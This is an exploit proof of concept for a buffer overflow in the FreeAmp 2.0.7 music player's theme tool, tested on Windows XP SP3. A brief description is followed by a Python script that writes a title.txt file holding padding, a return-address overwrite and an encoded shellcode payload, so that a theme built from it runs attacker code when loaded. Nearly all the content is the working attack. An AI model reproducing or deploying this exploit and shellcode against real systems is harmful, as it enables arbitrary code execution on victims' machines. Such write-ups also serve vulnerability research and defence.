# Exploit Title: FreeAmp 2.0.7 .fat Buffer Overflow
# Date: 22/06/2011
# Author: Iv�n Garc�a Ferreira
# Version: 2.0.7
# Tested on: Windows XP SP3
#
# Description:
# The freeamp music player has a tool to create your own theme. If you go to 
# "tools" directory in the Freeamp's directory you can see the "MakeTheme.exe" 
# tool. 
# With this command:
# c:\Freeamp\Tools> MakeTheme -d ..\themes\Freeamp.fat
# you uncompress the freeamp's theme. Then, you can see and a lot of files that
# the tool needs to make the theme. If you write a very long string in the 
# "title.txt" file and you generate a new theme with:
# c:\Freeamp\Tools> MakeTheme exploit.fat theme.xml title.txt *.bmp
# When the user try to test the new theme called "exploit", it will generate a 
# buffer overflow vulnerability.

fichero = open("title.txt","w")
fichero.write("A"*268)
fichero.write("\xF9\xCD\x20\x12")
fichero.write("C"*16)
fichero.write("\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1" +
"\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30" +
"\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa" +
"\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96" +
"\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b" +
"\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a" +
"\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83" +
"\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98" +
"\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61" +
"\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05" +
"\x7f\xe8\x7b\xca")
fichero.close()